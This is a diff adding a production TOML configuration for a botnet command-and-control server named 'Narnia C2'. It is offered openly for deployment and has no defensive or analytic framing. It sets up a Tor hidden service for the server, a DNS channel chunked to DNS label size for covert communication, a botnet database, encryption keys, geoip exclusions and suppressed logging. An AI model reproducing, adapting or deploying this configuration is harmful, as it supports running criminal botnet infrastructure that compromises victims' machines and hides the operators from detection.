@@ -1,0 +1,44 @@
+# Production configuration for Narnia C2 Server
+# Copy this to c2.toml and modify for production use
+
+[server]
+host = "0.0.0.0"
+port = 443
+workers = 8
+secret_key = "your_super_secure_secret_key_here_32_chars_minimum"
+enable_cors = false
+max_connections = 5000
+
+[database]
+url = "/var/lib/narnia-botnet/botnet.db"
+max_connections = 20
+enable_wal = true
+backup_interval_hours = 6
+
+[tor]
+enabled = true
+hidden_service_port = 443
+data_directory = "/var/lib/tor/narnia"
+contact_info = "Narnia Botnet Admin <admin@narnia.onion>"
+geoip_exclude_countries = ["US", "CN", "RU", "GB", "DE"]
+
+[dns]
+enabled = true
+domain = "c2.narnia-botnet.com"
+ttl = 60
+max_chunk_size = 63
+
+[security]
+enable_encryption = true
+encryption_key = "your_aes_256_encryption_key_here_32_chars"
+token_expiry_hours = 1
+rate_limit_requests = 50
+rate_limit_window_seconds = 60
+allowed_ips = ["192.168.1.0/24", "10.0.0.0/8"]
+
+[logging]
+level = "WARN"
+file_path = "/var/log/narnia/c2.log"
+max_file_size_mb = 500
+max_files = 10
+enable_console = false
